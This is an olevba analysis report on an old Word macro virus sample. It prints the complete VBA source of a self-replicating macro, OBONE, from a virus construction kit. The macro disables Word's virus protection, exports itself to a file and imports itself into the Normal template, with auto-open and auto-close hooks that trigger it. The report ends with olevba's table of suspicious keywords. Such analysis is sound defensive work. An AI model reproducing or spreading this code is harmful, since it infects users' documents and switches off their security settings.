olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-6a08fcc2f52b49633d99deb6b4d01a0ab9e628d3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-6a08fcc2f52b49633d99deb6b4d01a0ab9e628d3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OBONE.bas 
in file: Virus.MSWord.VMPC-based-6a08fcc2f52b49633d99deb6b4d01a0ab9e628d3 - OLE stream: 'Macros/VBA/OBONE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub OBONE()
Attribute OBONE.VB_Description = "Macro created 07/12/98 "
Attribute OBONE.VB_ProcData.VB_Invoke_Func = "Project.OBONE.OBONE"
    'The VicodinES Macro.Poppy Construction Kit v1.0c
    '====================================================
    'Code Written by VicodinES---------------------------
    
    'Poppy ID : 44996869-2370 Compatable with SR-1
    'I Give You ---> OBONE.Poppy !! Dig It !!
    
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("OBONE").Export "c:\OBONE.sys"
ActiveDocument.ReadOnlyRecommended = False
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "O B WON!", vbSystemModal
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "OBONE" Then xxx4499686912 = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "OBONE" Then not68697 = True
Next I
If xxx4499686912 = True And not68697 = False Then Set y6869449911 = NormalTemplate.VBProject.VBComponents
If xxx4499686912 = False And not68697 = True Then Set y6869449911 = ActiveDocument.VBProject.VBComponents
y6869449911.import "c:\OBONE.sys"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If not68697 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0c [SR-1 Compatable]
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 07/12/98 "
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.OBONE.AutoOpen"
    On Error Resume Next
    Call OBONE
End Sub
Sub AutoExit()
Attribute AutoExit.VB_Description = "Macro created 07/12/98 "
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = "Project.OBONE.AutoExit"
    On Error Resume Next
    Call OBONE
End Sub
Sub AutoExec()
Attribute AutoExec.VB_Description = "Macro created 07/12/98 "
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Project.OBONE.AutoExec"
    On Error Resume Next
    Call OBONE
End Sub
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro created 07/12/98 "
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.OBONE.AutoClose"
    On Error Resume Next
    Call OBONE
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

